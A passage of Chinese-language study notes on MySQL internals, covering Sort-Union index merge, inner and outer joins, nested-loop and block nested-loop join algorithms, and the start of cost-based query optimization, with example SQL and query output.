等值匹配的条件下才可能被⽤到，⽐⽅说下边这个查询就⽆法使⽤ 到Union索引合并：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM single_table WHERE key1 &lt; &#39;a&#39; OR key3 &gt; &#39;z&#39;</span><br></pre></td></tr></table></figure><p>这是因为根据key1 &lt; ‘a’从idx_key1索引中获取的⼆级索引记录 的主键值不是排好序的，根据key3 &gt; ‘z’从idx_key3索引中获取 的⼆级索引记录的主键值也不是排好序的，但是key1 &lt; ‘a’和 key3 &gt; ‘z’这两个条件⼜特别让我们动⼼，所以我们可以这样：</p><p>先根据key1 &lt; ‘a’条件从idx_key1⼆级索引总获取记录， 并按照记录的主键值进⾏排序</p><p>再根据key3 &gt; ‘z’条件从idx_key3⼆级索引总获取记录， 并按照记录的主键值进⾏排序</p><p>因为上述的两个⼆级索引主键值都是排好序的，剩下的操作和 Union索引合并⽅式就⼀样了。</p><p><strong>我们把上述这种先按照⼆级索引记录的主键值进⾏排序，之后按 照Union索引合并⽅式执⾏的⽅式称之为Sort-Union索引合并，很 显然，这种Sort-Union索引合并⽐单纯的Union索引合并多了⼀步 对⼆级索引记录的主键值排序的过程。</strong></p><p><strong>没有Sort-Intersection索引 合并么？是的，的确没有Sort-Intersection索引合并这么⼀ 说，</strong></p><p><strong>Sort-Union的适⽤场景是单独根据搜索条件从某个⼆级索引中获 取的记录数⽐较少，这样即使对这些⼆级索引记录按照主键值进⾏ 排序的成本也不会太⾼</strong></p><p>⽽Intersection索引合并的适⽤场景是单独根据搜索条件从某个 ⼆级索引中获取的记录数太多，导致回表开销太⼤，合并后可以明 显降低回表开销，但是如果加⼊Sort-Intersection后，就需要 为⼤量的⼆级索引记录按照主键值进⾏排序，这个成本可能⽐回表 查询都⾼了，所以也就没有引⼊Sort-Intersection这个玩意 ⼉。</p><p><strong>联合索引替代Intersection索引合并</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE single_table drop index idx_key1,</span><br><span class="line">idx_key3, add index idx_key1_key3(key1, key3);</span><br></pre></td></tr></table></figure><p>这样就不⽤多读⼀棵B+树，也不⽤合并结果，何乐⽽不为？</p><h1 id="两个表的亲密接触-——-连接的原理"><a href="#两个表的亲密接触-——-连接的原理" class="headerlink" title="两个表的亲密接触 —— 连接的原理"></a>两个表的亲密接触 —— 连接的原理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM t1;</span><br><span class="line">+------+------+</span><br><span class="line">| m1 | n1 |</span><br><span class="line">+------+------+</span><br><span class="line">| 1 | a |</span><br><span class="line">| 2 | b |</span><br><span class="line">| 3 | c |</span><br><span class="line">+------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT * FROM t2;</span><br><span class="line">+------+------+</span><br><span class="line">| m2 | n2 |</span><br><span class="line">+------+------+</span><br><span class="line">| 2 | b |</span><br><span class="line">| 3 | c |</span><br><span class="line">| 4 | d |</span><br><span class="line">+------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201104424.png" alt="image-20211201104403171"></p><p>像这样的结果集就可以称之为笛卡尔积</p><p>在MySQL中，连接查询的语法也很随意，只要 在FROM语句后边跟多个表名就好了，⽐如我们把t1表和t2表连接起 来的查询语句可以写成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM t1, t2;</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| m1 | n1 | m2 | n2 |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| 1 | a | 2 | b |</span><br><span class="line">| 2 | b | 2 | b |</span><br><span class="line">| 3 | c | 2 | b |</span><br><span class="line">| 1 | a | 3 | c |</span><br><span class="line">| 2 | b | 3 | c |</span><br><span class="line">| 3 | c | 3 | c |</span><br><span class="line">| 1 | a | 4 | d |</span><br><span class="line">| 2 | b | 4 | d |</span><br><span class="line">| 3 | c | 4 | d |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">9 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>在连接的时候过滤掉特定 记录组合是有必要的，在连接查询中的过滤条件可以分成两种：涉及单表的条件和涉及两表的条件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM t1, t2 WHERE t1.m1 &gt; 1 AND t1.m1 &#x3D; t2.m2 AND t2.n2 &lt; &#39;d&#39;;</span><br></pre></td></tr></table></figure><p>在这个查询中我们指明了这三个过滤条件：</p><p>t1.m1 &gt; 1</p><p>t1.m1 = t2.m2</p><p>t2.n2 &lt; ‘d’</p><p><strong>那么这个连接查询的⼤致执⾏过程如下：</strong></p><ol><li>⾸先确定第⼀个需要查询的表，这个表称之为驱动表。怎样在 单表中执⾏查询语句我们在前⼀章都唠叨过了，只需要选取代 价最⼩的那种访问⽅法去执⾏单表查询语句就好了（就是说从 const、ref、ref_or_null、range、index、all这些执⾏⽅法 中选取代价最⼩的去执⾏查询）。此处假设使⽤t1作为驱动 表，那么就需要到t1表中找满⾜t1.m1 &gt; 1的记录，因为表 中的数据太少，我们也没在表上建⽴⼆级索引，所以此处查询 t1表的访问⽅法就设定为all吧，也就是采⽤全表扫描的⽅式 执⾏单表查询。</li></ol><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201105010.png" alt="image-20211201105008995"></p><ol><li><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201105225.png" alt="image-20211201105223782"></p><p>也就是说整个连接查询最后的结果只有两条符合过滤条件的记录：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+------+------+------+------+</span><br><span class="line">| m1 | n1 | m2 | n2 |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| 2 | b | 2 | b |</span><br><span class="line">| 3 | c | 3 | c |</span><br><span class="line">+------+------+------+------+</span><br></pre></td></tr></table></figure><p>这个两表连接查询共需 要查询1次t1表，2次t2表。当然这是在特定的过滤条件下的结果， 如果我们把t1.m1 &gt; 1这个条件去掉，那么从t1表中查出的记录就 有3条，就需要查询3次t3表了。也就是说在两表连接查询中，驱动 表只需要访问⼀次，被驱动表可能被访问多次。</p><p><strong>内连接和外连接</strong></p><p>内连接例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT s1.number, s1.name, s2.subject,</span><br><span class="line">s2.score FROM student AS s1, score AS s2 WHERE</span><br><span class="line">s1.number &#x3D; s2.number;</span><br></pre></td></tr></table></figure><p><strong>需求：驱动表中的记录即使在被驱动表中没有匹配的记录，也仍然需要加⼊到结果集。</strong></p><p>为了 解决这个问题，就有了<strong>内连接和外连接</strong>的概念：</p><p><strong>对于内连接的两个表，驱动表中的记录在被驱动表中找不到匹配的记录，该记录不会加⼊到最后的结果集，我们上边提到的连接是所谓的内连接。</strong></p><p><strong>对于外连接的两个表，驱动表中的记录即使在被驱动表中没有 匹配的记录，也仍然需要加⼊到结果集。</strong></p><p>在MySQL中，根据选取驱动表的不同，外连接仍然可以细分为 2种：</p><ul><li>左外连接 选取左侧的表为驱动表。</li><li>右外连接 选取右侧的表为驱动表。</li></ul><p><strong>放 在不同地⽅的过滤条件是有不同语义的：</strong></p><p><strong>WHERE⼦句中的过滤条件</strong></p><p>WHERE⼦句中的过滤条件就是我们平时⻅的那种，不论是内连接还是外连接，凡是不符合WHERE⼦句中的过滤条件的记录都不会被加⼊最后的结果集。</p><p><strong>ON⼦句中的过滤条件</strong></p><p>对于外连接的驱动表的记录来说，如果⽆法在被驱动表中找到匹配ON⼦句中的过滤条件的记录，那么该记录仍然会被加⼊到 结果集中，对应的被驱动表记录的各个字段使⽤NULL值填充。</p><p><strong>需要注意的是，这个ON⼦句是专⻔为外连接驱动表中的记录在被驱动表找不到匹配记录时应不应该把该记录加⼊结果集这个 场景下提出的，所以如果把ON⼦句放到内连接中，MySQL会把 它和WHERE⼦句⼀样对待，也就是说：内连接中的WHERE⼦句 和ON⼦句是等价的。</strong></p><p>⼀般情况下，我们都把只涉及单表的过滤条件放到WHERE⼦句中，<strong>把 涉及两表的过滤条件都放到ON⼦句中，我们也⼀般把放到ON⼦句中 的过滤条件也称之为连接条件。</strong></p><p><strong>左（外）连接的语法还是挺简单的，⽐如我们要把t1表和t2表进⾏ 左外连接查询可以这么写：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM t1 LEFT [OUTER] JOIN t2 ON 连接条件</span><br><span class="line">[WHERE 普通过滤条件];</span><br></pre></td></tr></table></figure><p>其中中括号⾥的OUTER单词是可以省略的。对于LEFT JOIN类型的 连接来说，我们把放在左边的表称之为外表或者驱动表，右边的表称 之为内表或者被驱动表。所以上述例⼦中t1就是外表或者驱动 表，t2就是内表或者被驱动表。需要注意的是，<strong>对于左（外）连接 和右（外）连接来说，必须使⽤ON⼦句来指出连接条件。</strong>了解了左 （外）连接的基本语法之后，再次回到我们上边那个现实问题中来， 看看怎样写查询语句才能把所有的学⽣的成绩信息都查询出来，即使 是缺考的考⽣也应该被放到结果集中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT s1.number, s1.name, s2.subject,</span><br><span class="line">s2.score FROM student AS s1 LEFT JOIN score AS s2</span><br><span class="line">ON s1.number &#x3D; s2.number;</span><br></pre></td></tr></table></figure><p><strong>右（外）连接的语法 右（外）连接和左（外）连接的原理是⼀样⼀样的，语法也只是把 LEFT换成RIGHT⽽已</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM t1 RIGHT [OUTER] JOIN t2 ON 连接条件</span><br><span class="line">[WHERE 普通过滤条件];</span><br></pre></td></tr></table></figure><p><strong>内连接的语法</strong></p><p>内连接和外连接的根本区别就是在驱动表中的记录不符合ON⼦句中 的连接条件时不会把该记录加⼊到最后的结果集。</p><p>最简单的 内连接语法，就是直接把需要连接的多个表都放到FROM⼦句后边。 其实针对内连接，MySQL提供了好多不同的语法，我们以t1和t2表 为例瞅瞅：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT s1.number, s1.name, s2.subject,</span><br><span class="line">s2.score FROM student AS s1, score AS s2 WHERE</span><br><span class="line">s1.number &#x3D; s2.number;</span><br><span class="line"></span><br><span class="line">SELECT * FROM t1 [INNER | CROSS] JOIN t2 [ON 连接</span><br><span class="line">条件] [WHERE 普通过滤条件];</span><br><span class="line"></span><br><span class="line"># 也就是说在MySQL中，下边这⼏种内连接的写法都是等价的：</span><br><span class="line">SELECT * FROM t1 JOIN t2;</span><br><span class="line">SELECT * FROM t1 INNER JOIN t2;</span><br><span class="line">SELECT * FROM t1 CROSS JOIN t2;</span><br><span class="line">#上边的这些写法和直接把需要连接的表名放到FROM语句之后，⽤逗号,分隔开的写法是等价的：</span><br><span class="line">SELECT * FROM t1, t2;</span><br><span class="line">#我们推荐INNER JOIN的形式书写内连接，由于在内连接中ON⼦句和WHERE⼦句是等价的，所以内连接中不要求强制写明ON⼦句</span><br></pre></td></tr></table></figure><p>对于内连接来说，驱动表和被驱动表是可以互换的，并不会影响 最后的查询结果。但是对于外连接来说，由于驱动表中即使在被驱动表中找不到符合ON⼦句连接条件的记录仍然会被加⼊到 结果集中，所以此时驱动表和 被驱动表的关系就很重要了，也就是说左外连接和右外连接的驱动表 和被驱动表不能轻易互换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM t1 INNER JOIN t2 ON t1.m1 &#x3D;</span><br><span class="line">t2.m2;</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| m1 | n1 | m2 | n2 |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| 2 | b | 2 | b |</span><br><span class="line">| 3 | c | 3 | c |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT * FROM t1 LEFT JOIN t2 ON t1.m1 &#x3D;</span><br><span class="line">t2.m2;</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| m1 | n1 | m2 | n2 |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| 2 | b | 2 | b |</span><br><span class="line">| 3 | c | 3 | c |</span><br><span class="line">| 1 | a | NULL | NULL |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT * FROM t1 RIGHT JOIN t2 ON t1.m1 &#x3D;</span><br><span class="line">t2.m2;</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| m1 | n1 | m2 | n2 |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| 2 | b | 2 | b |</span><br><span class="line">| 3 | c | 3 | c |</span><br><span class="line">| NULL | NULL | 4 | d |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>t1表和t2表执⾏内连接查询的⼤致过程：</p><p>步骤1：选取驱动表，使⽤与驱动表相关的过滤条件，选取代价最低的单表访问⽅法来执⾏对驱动表的单表查询。</p><p><strong>嵌套循环连接（Nested-Loop Join）</strong></p><p>步骤2：对上⼀步骤中查询驱动表得到的结果集中每⼀条记 录，都分别到被驱动表中查找匹配的记录。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201115046.png" alt="image-20211201115045460"></p><p>如果有3个表进⾏连接的话，那么步骤2中得到的结果集就像是新的 驱动表，然后第三个表就成为了被驱动表，重复上边过程，也就是步 骤2中得到的结果集中的每⼀条记录都需要到t3表中找⼀找有没有匹 配的记录，⽤伪代码表示⼀下这个过程就是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for each row in t1 &#123; #此处表示遍历满⾜对t1单表查询结果集中的每⼀条记录</span><br><span class="line">    for each row in t2 &#123; #此处表示对于某条t1表的记录来说，遍历满⾜对t2单表查询结果集中的每⼀条记录</span><br><span class="line">        for each row in t3 &#123; #此处表示对于某条t1和t2表的记录组合来说，对t3表进⾏单表查询</span><br><span class="line">            if row satisfies join conditions,</span><br><span class="line">                            send to client</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>所以这种驱动表只访问⼀次，但被驱动表却可能被多次访问，访问次数取决于对驱动表执⾏单表查询后 的结果集中的记录条数的连接执⾏⽅式称之为嵌套循环连接 （Nested-Loop Join），这是最简单，也是最笨拙的⼀种连接查询算法。</strong></p><p><strong>使⽤索引加快连接速度</strong></p><p>查询t2表其实就相当于⼀次单表扫描，我们 可以利⽤索引来加快查询速度哦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM t1, t2 WHERE t1.m1 &gt; 1 AND t1.m1 &#x3D;</span><br><span class="line">t2.m2 AND t2.n2 &lt; &#39;d&#39;;</span><br></pre></td></tr></table></figure><p>在m2列上建⽴索引，因为对m2列的条件是等值查找，⽐如 t2.m2 = 2、t2.m2 = 3等，所以可能使⽤到ref的访问⽅ 法，假设使⽤ref的访问⽅法去执⾏对t2表的查询的话，需要回表之后再判断t2.n2 &lt; d这个条件是否成⽴。</p><p>这⾥有⼀个⽐较特殊的情况，就是假设m2列是t2表的主键或者 唯⼀⼆级索引列，那么使⽤t2.m2 = 常数值这样的条件从t2 表中查找记录的过程的代价就是常数级别的。我们知道在单表 中使⽤主键值或者唯⼀⼆级索引列的值进⾏等值查找的⽅式称 之为const，⽽设计MySQL的⼤叔把在连接查询中对被驱动表 使⽤主键值或者唯⼀⼆级索引列的值进⾏等值查找的查询执⾏ ⽅式称之为：<strong>eq_ref</strong>。</p><p>在n2列上建⽴索引，涉及到的条件是t2.n2 &lt; ‘d’，可能⽤ 到range的访问⽅法，假设使⽤range的访问⽅法对t2表的查 询的话，需要回表之后再判断在m2列上的条件是否成⽴</p><p>假设m2和n2列上都存在索引的话，那么就需要从这两个⾥边⼉挑⼀ 个代价更低的去执⾏对t2表的查询。当然，建⽴了索引不⼀定使⽤ 索引，只有在⼆级索引 + 回表的代价⽐全表扫描的代价更低时才会 使⽤索引。</p><p><strong>另外，有时候连接查询的查询列表和过滤条件中可能只涉及被驱动表 的部分列，⽽这些列都是某个索引的⼀部分，这种情况下即使不能使 ⽤eq_ref、ref、ref_or_null或者range这些访问⽅法执⾏对被 驱动表的查询的话，也可以使⽤索引扫描，也就是index的访问⽅法 来查询被驱动表。</strong></p><p><strong>基于块的嵌套循环连接（Block Nested-Loop Join）</strong></p><p>扫描⼀个表的过程其实是先把这个表从磁盘上加载到内存中，然后从 内存中⽐较匹配条件是否满⾜。</p><p>采⽤嵌套循环连接算法的两表连接过程 中，被驱动表可是要被访问好多次的，如果这个被驱动表中的数据特 别多⽽且不能使⽤索引进⾏访问，那就相当于要从磁盘上读好⼏次这个表，这个I/O代价就⾮常⼤了，所以我们得想办法：<strong>尽量减少访问 被驱动表的次数。</strong></p><p>我们可不可以在把被驱动表的记录加载到内 存的时候，<strong>⼀次性和多条驱动表中的记录做匹配</strong>，这样就可以⼤⼤减 少重复从磁盘上加载被驱动表的代价了。</p><p>join buffer就是执⾏连接查询前 申请的⼀块固定⼤⼩的内存，先把若⼲条驱动表结果集中的记录装在 这个join buffer中，然后开始扫描被驱动表，每⼀条被驱动表的 记录⼀次性和join buffer中的多条驱动表记录做匹配，因为匹配 的过程都是在内存中完成的，所以这样可以显著减少被驱动表的I/O 代价。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201132144.png" alt="image-20211201132142850"></p><p><strong>这种加⼊了join buffer的嵌套循环连接算法称之 为基于块的嵌套连接（Block Nested-Loop Join）算法。这个join buffer的⼤⼩是可以通过启动参数或者系统变量 join_buffer_size进⾏配置，默认⼤⼩为262144字节（也就 是256KB），最⼩可以设置为128字节。</strong></p><p>另外需要注意的是，驱动表的记录并不是所有列都会被放到join buffer中，只有查询列表中的列和过滤条件中的列才会被放到join buffer中，所以再次提醒我们，最好不要把*作为查询列表，只需 要把我们关⼼的列放到查询列表就好了，这样还可以在join buffer中放置更多的记录。</p><h1 id="谁最便宜就选谁-——-MySQL-基于成本的优化"><a href="#谁最便宜就选谁-——-MySQL-基于成本的优化" class="headerlink" title="谁最便宜就选谁 —— MySQL 基于成本的优化"></a>谁最便宜就选谁 —— MySQL 基于成本的优化</h1><p>在MySQL中⼀条查询语句 的执⾏成本是由下边这两个⽅⾯组成的：</p><p><strong>I/O成本</strong></p><p>我们的表经常使⽤的MyISAM、InnoDB存储引擎都是将数据和 索引都存储到磁盘上的，当我们想查询表中的记录时，需要先 把数据或者索引加载到内存中然后再操作。这个从磁盘到内存 这个加载的过程损耗的时间称之为I/O成本。</p><p><strong>CPU成本</strong></p><p>读取以及检测记录是否满⾜对应的搜索条件、对结果集进⾏排 序等这些操作损耗的时间称之为CPU成本。</p><p>对于InnoDB存储引擎来说，⻚是磁盘和内存之间交互的基本单位</p><p><strong>基于成本的优化步骤</strong></p><ol><li>根据搜索条件，找出所有可能使⽤的索引</li><li>计算全表扫描的代价</li><li>计算使⽤不同索引执⾏查询的代价</li><li>对⽐各种执⾏⽅案的代价，找出成本最低的那⼀个</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE single_table (</span><br><span class="line">id INT NOT NULL AUTO_INCREMENT,</span><br><span class="line">key1 VARCHAR(100),</span><br><span class="line">key2 INT,</span><br><span class="line">key3 VARCHAR(100),</span><br><span class="line">key_part1 VARCHAR(100),</span><br><span class="line">key_part2 VARCHAR(100),</span><br><span class="line">key_part3 VARCHAR(100),</span><br><span class="line">common_field VARCHAR(100),</span><br><span class="line">PRIMARY KEY (id),</span><br><span class="line">KEY idx_key1 (key1),</span><br><span class="line">UNIQUE KEY idx_key2 (key2),</span><br><span class="line">KEY idx_key3 (key3),</span><br><span class="line">KEY idx_key_part(key_part1, key_part2,</span><br><span class="line">key_part3)</span><br><span class="line">) Engine&#x3D;InnoDB CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM single_table WHERE</span><br><span class="line">key1 IN (&#39;a&#39;,&#39;b&#39;,&#39;c&#39;) AND</span><br><span class="line">key2 &gt; 10 AND key2 &lt; 1000 AND</span><br><span class="line">key3 &gt; key2 AND</span><br><span class="line">key_part1 LIKE &#39;%hello%&#39; AND</span><br><span class="line">common_field &#x3D; &#39;123&#39;;</span><br></pre></td></tr></table></figure><p>我们前边说过，对于B+树索引来说，只要索引列和常数使 ⽤=、&lt;=&gt;、IN、NOT IN、IS NULL、IS NOT NULL、&gt;、&lt;、&gt;=、&lt;=、BETWEEN、!=（不等于也可以写成&lt;&gt;）或 者LIKE操作符连接起来，就可以产⽣⼀个所谓的范围区间（LIKE匹 配字符串前缀也⾏），也就是说这些搜索条件都可能使⽤到索引，设计MySQL的⼤叔把⼀个查询中可能使⽤到的索引称之为possible keys。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key1 IN (&#39;a&#39;,&#39;b&#39;,&#39;c&#39;)，这个搜索条件可以使⽤⼆级索引idx_key1。</span><br><span class="line">key2 &gt; 10 AND key2 &lt; 1000，这个搜索条件可以使⽤⼆级索引idx_key2。</span><br><span class="line">key3 &gt; key2，这个搜索条件的索引列由于没有和常数⽐较，所以并不能使⽤到索引。</span><br><span class="line">key_part1 LIKE &#39;%hello%&#39;，key_part1通过LIKE操作符和以通配符开头的字符串做⽐较，不可以适⽤索引。</span><br><span class="line">common_field &#x3D; &#39;123&#39;，由于该列上压根⼉没有索引，所以不会⽤到索引。</span><br></pre></td></tr></table></figure><p><strong>综上所述，上边的查询语句可能⽤到的索引，也就是possible keys只有idx_key1和idx_key2。</strong></p><p><strong>计算全表扫描的代价</strong></p><p>全表扫描的意思就是把聚簇索引中的记 录都依次和给定的搜索条件做⼀下⽐较，把符合搜索条件的记录加⼊ 到结果集，所以需要将聚簇索引对应的⻚⾯加载到内存中，然后再检 测记录是否符合搜索条件。由于查询成本=I/O成本+CPU成本，所 以计算全表扫描的代价需要两个信息： <strong>聚簇索引占⽤的⻚⾯数、该表中的记录数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; USE xiaohaizi;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SHOW TABLE STATUS LIKE &#39;single_table&#39;\G</span><br><span class="line">*************************** 1. row</span><br><span class="line">***************************</span><br><span class="line">Name: single_table</span><br><span class="line">Engine: InnoDB</span><br><span class="line">Version: 10</span><br><span class="line">Row_format: Dynamic</span><br><span class="line">Rows: 9693</span><br><span class="line">Avg_row_length: 163</span><br><span class="line">Data_length: 1589248</span><br><span class="line">Max_data_length: 0</span><br><span class="line">Index_length: 2752512</span><br><span class="line">Data_free: 4194304</span><br><span class="line">Auto_increment: 10001</span><br><span class="line">Create_time: 2018-12-10 13:37:23</span><br><span class="line">Update_time: 2018-12-10 13:38:03</span><br><span class="line">Check_time: NULL</span><br><span class="line">Collation: utf8_general_ci</span><br><span class="line">Checksum: NULL</span><br><span class="line">Create_options:</span><br><span class="line">Comment:</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>本选项表示表中的记录条数。对于使⽤MyISAM存储引擎的表 来说，该值是准确的，对于使⽤InnoDB存储引擎的表来说， 该值是⼀个估计值。Rows值只有9693条记录，实 际上表中有10000条记录。</p><p>Data_length = 聚簇索引的⻚⾯数量 x 每个⻚⾯的⼤⼩</p><p>我们的single_table使⽤默认16KB的⻚⾯⼤⼩，⽽上边查 询结果显示Data_length的值是1589248，所以我们可以反 向来推导出聚簇索引的⻚⾯数量：</p><p>聚簇索引的⻚⾯数量 = 1589248 ÷ 16 ÷ 1024 = 97</p><p><strong>计算使⽤不同索引执⾏查询的代价</strong></p><p>MySQL查询优化器先分析使⽤唯⼀⼆级索引的成本，再分析使 ⽤普通索引的成本，所以我们也先分析idx_key2的成本，然后再看 使⽤idx_key1的成本</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201140758.png" alt="image-20211201140757448"></p><p>对于使⽤⼆级索引 + 回表⽅式的查询，设计MySQL的⼤叔计算这种 查询的成本依赖两个⽅⾯的数据：</p><p><strong>范围区间数量</strong></p><p>不论某个范围区间的⼆级索引到底占⽤了多少⻚⾯，<strong>查询优化 器粗暴的认为读取索引的⼀个范围区间的I/O成本和读取⼀个⻚⾯是相同的。</strong>本例中使⽤idx_key2的范围区间只有⼀ 个：(10, 1000)，所以相当于<strong>访问这个范围区间的⼆级索引 付出的I/O成本就是：</strong></p><p><strong><em>1 x 1.0 = 1.0\</em></strong></p><p><strong>需要回表的记录数</strong></p><p>优化器需要计算⼆级索引的某个范围区间到底包含多少条记 录，对于本例来说就是要计算idx_key2在(10, 1000)这个 范围区间中包含多少⼆级索引记录</p><p>如果区间最左记录和区间最右记录相隔不太远 （在MySQL 5.7.21这个版本⾥，只要相隔不⼤于10个 ⻚⾯即可），那就可以精确统计出满⾜key2 &gt; 10 AND key2 &lt; 1000条件的⼆级索引记录条数。否则只沿着区 间最左记录向右读10个⻚⾯，计算平均每个⻚⾯中包含 多少记录，然后⽤这个平均值乘以区间最左记录和区间最 右记录之间的⻚⾯数量就可以了。<strong>那么问题⼜来了，怎么 估计区间最左记录和区间最右记录之间有多少个⻚⾯呢？ 解决这个问题还得回到B+树索引的结构中来：</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201141446.png" alt="image-20211201141444348"></p><p><strong>我们想计算区间最左记录和区间最右记录之 间的⻚⾯数量就相当于计算⻚b和⻚c之间有多少⻚⾯， 